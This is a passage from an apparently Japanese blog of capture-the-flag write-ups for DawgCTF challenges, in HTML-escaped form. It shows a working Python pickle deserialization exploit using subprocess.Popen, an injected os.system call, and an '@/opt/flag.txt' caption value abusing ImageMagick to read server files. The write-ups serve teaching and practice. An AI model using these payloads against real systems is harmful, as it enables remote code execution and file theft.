&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [(x &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, y), (x, y &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;), (x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, y), (x, y &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                shuffle(d)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (xx, yy) &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; d:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; vis[yy][xx]: &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; xx &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; x: hor[max(y, yy)][x] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;+  &amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; yy &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; y: ver[y][max(x, xx)] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;   &amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        walk(xx, yy)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        walk(randrange(w), randrange(h))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (a, b) &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; zip(hor, ver):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                s &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(a &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;replace(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;O&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; replace_last(s, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;  &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;FF&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; s
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;__main__&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        welcome()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        still_playing &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        maze &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; make_maze()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt;(still_playing):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                still_playing &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; make_move(maze)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Congrats! You&amp;#39;ve finished the maze! Here&amp;#39;s your flag:&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/cat flag.txt&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;__main__()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;__main__()&lt;/code&gt;関数を見ると&lt;code&gt;os.system(&amp;quot;/bin/cat flag.txt&amp;quot;)&lt;/code&gt;とあるので、そのまま&lt;code&gt;make_move(os.system(&amp;quot;/bin/cat flag.txt&amp;quot;))&lt;/code&gt;を渡すとフラグが得られます。&lt;/p&gt;
&lt;h2 id=&#34;jellyspotters&#34;&gt;Jellyspotters&lt;/h2&gt;
&lt;h3 id=&#34;問題-1&#34;&gt;問題&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;100 points&lt;/strong&gt;&lt;br&gt;
The leader of the Jellyspotters has hired you to paint them a poster for their convention, using this painting program. Also, the flag is in ~/flag.txt.&lt;/p&gt;
&lt;p&gt;nc umbccd.io 4200&lt;/p&gt;
&lt;p&gt;Author: nb&lt;/p&gt;
&lt;h3 id=&#34;解説-1&#34;&gt;解説&lt;/h3&gt;
&lt;p&gt;ncコマンドで接続すると描画プログラムのシェルのようなものがあります。helpを確認して少し操作してみると以下のようになります。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Welcome to the Paint Program!
Paint us a new poster for the Jellyspotters 2021 convention. Make Kevin proud.
Type &amp;#39;help&amp;#39; for help.
&amp;gt; help
Listing commands...
display             Display the canvas
clearall            Clear the canvas
set [row] [col]     Set a particular pixel
clear [row] [col]   Clear a particular pixel
export              Export the canvas state
import [canvas]     Import a previous canvas
exit                Quit the program
&amp;gt; display
##################
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
##################
&amp;gt; set 5 5
##################
#                #
#                #
#                #
#                #
#                #
#     0          #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
##################
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;exportとimportは以下のような使い方ができます。表示形式はBase64のようですが、デコードしてもそのまま読めるような形にはなりませんでした。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; export
Exported canvas string:
gASVSQIAAAAAAABdlChdlCiMASCUaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAKMATCUaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlZS4=
&amp;gt; import gASVSQIAAAAAAABdlChdlCiMASCUaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAKMATCUaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlZS4=
Importing...
Done!
##################
#                #
#                #
#                #
#                #
#                #
#     0          #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
##################
&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;何かヒントが欲しいのでimportでエラーを吐きそうな適当な引数を渡します。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; import a
Importing...
Traceback (most recent call last):
  File &amp;#34;/home/challuser/jellyspotters.py&amp;#34;, line 67, in &amp;lt;module&amp;gt;
    imp = pickle.loads(base64.b64decode(split[1]))
  File &amp;#34;/usr/lib/python3.8/base64.py&amp;#34;, line 87, in b64decode
    return binascii.a2b_base64(s)
binascii.Error: Invalid base64-encoded string: number of data characters (1) cannot be 1 more than a multiple of 4
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Pythonでpickleを使ってPythonオブジェクトを変換しBase64エンコードをしているみたいなので、ローカルで同じことをすればPythonオブジェクトに復元したり、好きなPythonオブジェクトをimportで渡したりできそうです。&lt;br&gt;
復元してみると二次元リストだということが分かるので、以下のコードで適当なデータでBase64文字列を作り、渡してみます。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pickle
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;f&amp;#34;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pickle&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(data)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64encode(p))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;出力&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;b&amp;#39;gASVJQAAAAAAAABdlChdlCiMAWGUjAFilIwBY5RlXZQojAFklIwBZZSMAWaUZWUu&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;importに渡してみるとこうなります。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; import gASVJQAAAAAAAABdlChdlCiMAWGUjAFilIwBY5RlXZQojAFklIwBZZSMAWaUZWUu
Importing...
Done!
##################
#abc#
#def#
##################
&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;どうにかして内部のファイルを出力するような関数を実行させたいところですが、静的なオブジェクトしか渡せないのでどうすればよいか考えました。考えても思いつかなかったので「pickle vulnerability」とかで検索すると任意コード実行の脆弱性(参考: &lt;a href=&#34;https://blog.nelhage.com/2011/03/exploiting-pickle/&#34;&gt;https://blog.nelhage.com/2011/03/exploiting-pickle/&lt;/a&gt;)がありました。&lt;br&gt;
これを利用して以下のコードを書いて出力をimportに渡せばフラグが得られます。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pickle
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; subprocess
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;RunShell&lt;/span&gt;(object):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;__reduce__&lt;/span&gt;(self):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (subprocess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Popen, ((&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cat&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag.txt&amp;#39;&lt;/span&gt;),))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; RunShell()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pickle&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(r)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64encode(p))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;mdl-considered-harmful&#34;&gt;MDL Considered Harmful&lt;/h2&gt;
&lt;h3 id=&#34;問題-2&#34;&gt;問題&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;225 points&lt;/strong&gt;&lt;br&gt;
There&amp;rsquo;s a bot named MDLChef in the Discord. You need to DM it, it doesn&amp;rsquo;t respond in the server. On its host machine, there&amp;rsquo;s a file at /opt/flag.txt - it contains the flag. Go get it.&lt;/p&gt;
&lt;p&gt;Note: This is NOT an OSINT challenge. The source code really isn&amp;rsquo;t available. Good luck.&lt;/p&gt;
&lt;p&gt;Author: nb&lt;/p&gt;
&lt;h3 id=&#34;解説-2&#34;&gt;解説&lt;/h3&gt;
&lt;p&gt;DawgCTFのDiscordサーバーにMDLChefというBotがいて、「DM me and say /help」とのことなのでDMに/helpを送ります。&lt;/p&gt;
&lt;p&gt;以下の返信が来ます。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;MDLChef Bot&lt;/strong&gt;&lt;br&gt;
This bot generates memes using MDL, the Meme Description Language.&lt;br&gt;
Here is an example of a valid MDL sample:&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;version:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;MDL/1.1&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;type:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;meme&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;base:&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;format:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Meme.Matrix.WhatIfIToldYou&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;caption:&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;topText:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;what if i told you&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;bottomText:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;you can code your memes&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;Just send a valid MDL snippet in the DM and the bot will automatically recognize it and respond.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;提示されたMDL sampleを送信してみるとミーム画像が返されました。&lt;br&gt;
/helpはスラッシュコマンドだったので、/を打って候補に出る他のコマンドも試してみます。&lt;br&gt;
/creditsを送信すると以下の返信が来ます。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Credits&lt;/strong&gt;&lt;br&gt;
Thank you to&amp;hellip;&lt;br&gt;
- The Rust programming language&lt;br&gt;
- The Serenity Discord library&lt;br&gt;
- The ImageMagick caption command for meme generation&lt;br&gt;
Note: The source code for this bot is NOT publicly available, due to the CyberDawgs&amp;rsquo; extreme anti-open-source and pro-proprietary stance. We don&amp;rsquo;t NEED public auditing. All of the code in this bot is totally and completely secure.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Rust、Serenity Discordライブラリ、ImageMagickのcaptionコマンドを使っているということなので、それぞれで内部ファイルを読み込んで表示できそうな脆弱性がないか検索してみると、「imagemagick caption from file」で検索してImageMagickのcaptionコマンドでファイルから読み込んでテキストを画像に書き込める機能(参考: &lt;a href=&#34;https://legacy.imagemagick.org/discourse-server/viewtopic.php?t=31322&#34;&gt;https://legacy.imagemagick.org/discourse-server/viewtopic.php?t=31322&lt;/a&gt;)が見つかりました。&lt;/p&gt;
&lt;p&gt;以下のMDLを送るとフラグが手に入ります。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;version:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;MDL/1.1&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;type:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;meme&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;base:&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;format:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Meme.DrakeYesNo&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;caption:&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;topText:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;@/opt/flag.txt&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;bottomText:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;/opt/flag.txt&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
    </item>
    
    <item>
      <title></title>
      <link>/dicectf2021/babiercsp/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
